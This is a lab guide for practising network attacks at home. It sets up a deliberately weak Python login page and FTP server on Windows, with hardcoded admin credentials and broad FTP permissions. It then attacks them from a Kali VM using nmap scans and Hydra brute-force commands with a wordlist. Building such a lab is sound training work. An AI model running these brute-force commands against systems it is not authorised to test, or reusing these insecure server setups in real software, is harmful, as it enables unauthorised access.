# Two-Machine Hacking Lab Setup

> Mac (Kali VM) → Windows (target), same LAN

## Overview

Physical two-machine setup for real network penetration testing:
- **Attacker:** Mac (M1/M2/M3/M4) running Kali Linux in VM (UTM/VMware Fusion)
- **Target:** Windows 10/11 machine (this machine, no admin rights needed for basic services)

## Target Setup (Windows Side)

### What to Set Up

**HTTP login form** (port 8080) — Python `http.server`, no Flask needed:

```bash
# Run in background
python -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class LoginHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''<html><body>
<h2>Admin Login</h2>
<form method='POST' action='/login'>
Username: <input name='user'><br>
Password: <input name='pass' type='password'><br>
<input type='submit' value='Login'>
</form>
</body></html>''')

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(body)
        user = params.get('user', [''])[0]
        pwd = params.get('pass', [''])[0]
        if user == 'admin' and pwd == 'secret123':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<h2>ACCESS GRANTED! Welcome admin!</h2>')
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<h2>Login Failed</h2>')

HTTPServer(('0.0.0.0', 8080), LoginHandler).serve_forever()
" 2>&1 &
```

**FTP server** (port 21) — pyftpdlib:

```bash
pip install pyftpdlib

python -c "
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import os

authorizer = DummyAuthorizer()
authorizer.add_user('admin', 'secret123', 'C:/Users/Admin/Desktop', perm='elradfmw')
authorizer.add_anonymous(os.getenv('TEMP'), perm='r')

handler = FTPHandler
handler.authorizer = authorizer
server = FTPServer(('0.0.0.0', 21), handler)
server.serve_forever()
" 2>&1 &
```

### What CANNOT be done without admin rights

| Service | Why blocked | Workaround |
|---------|-------------|------------|
| OpenSSH Server | Needs admin for install (`Add-WindowsCapability`) | Use Python SSH server (limited) or HTTP/FTP |
| Firewall rules | Needs admin for `New-NetFirewallRule` | Windows usually allows inbound on same subnet by default; test first |
| RDP Server | Windows Home edition doesn't support it + needs admin | Use Pro/Enterprise edition |
| Raw socket SYNs (nmap from target) | Needs admin | Not relevant (nmap runs on Kali, not target) |

## Kali Attacker Workflow (from Mac VM)

### Step 1: Discover the target on LAN

```bash
# Find all live hosts on the local subnet
nmap -sn 192.168.1.0/24

# Look for the Windows machine (likely shows hostname or netbios name)
# Expected output includes:
# Nmap scan report for 192.168.1.93
# Host is up (0.0013s latency).
```

### Step 2: Port scan to discover services

```bash
# Scan all TCP ports on the target
nmap -sV 192.168.1.93

# Should discover:
# 21/tcp    open  ftp     pyftpdlib 2.x
# 8080/tcp  open  http    Python http.server
```

### Step 3: Hydra brute-force HTTP login

```bash
# Hydra against HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 192.168.1.93 http-post-form "/login:user=^USER^&pass=^PASS^:Failed"

# Key parameters explained:
# -l admin           = single username
# -P rockyou.txt     = password wordlist (14 million+ passwords)
# -s 8080            = non-default port (otherwise defaults to 80)
# /login             = the form action endpoint
# user=^USER^&pass=^PASS^  = Hydra substitutes ^USER^ and ^PASS^ with dictionary values
# :Failed            = failure indicator string (Hydra detects successful login when this string is ABSENT in response)
```

### Step 4: Hydra brute-force FTP

```bash
# User + password dictionary attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.93

# Or with known user list
hydra -L users.txt -P rockyou.txt ftp://192.168.1.93
```

### Step 5: Login with found credentials

```bash
# HTTP login (verify)
curl -s -X POST -d "user=admin&pass=secret123" http://192.168.1.93:8080/login
# → <h2>ACCESS GRANTED! Welcome admin!</h2>

# FTP login
ftp admin@192.168.1.93
# Password: secret123
ftp> ls
ftp> get flag.txt
ftp> quit
```

### Step 6: Verify downloaded flag

```bash
cat flag.txt
# → 🎯 Congratulations! You hacked into the Dell!
```

## Flag File

Place a congratulatory flag file on the Desktop for the attacker to find:

```
path: C:\Users\Admin\Desktop\flag.txt
content: 🎯 Congratulations! You hacked into the Dell!
```

## Practical Notes

- **LAN IP discovery:** Use `nmap -sn` to find the target. The Windows machine may show its hostname.
- **Port 80:** Windows system often uses port 80 — don't use it for the HTTP target.
- **Download speed:** On slow connections, `curl --noproxy "*"` is essential to bypass the Vortex proxy at `127.0.0.1:7897` which throttles large downloads.
- **pyftpdlib install:** `pip install pyftpdlib` may time out on slow connections. Use `--noproxy "*"` environment or install from a previously cached wheel.
- **Firewall:** If the Kali VM can't connect, check Windows Defender Firewall. Without admin rights, the user may need to approve the incoming connection popup manually.
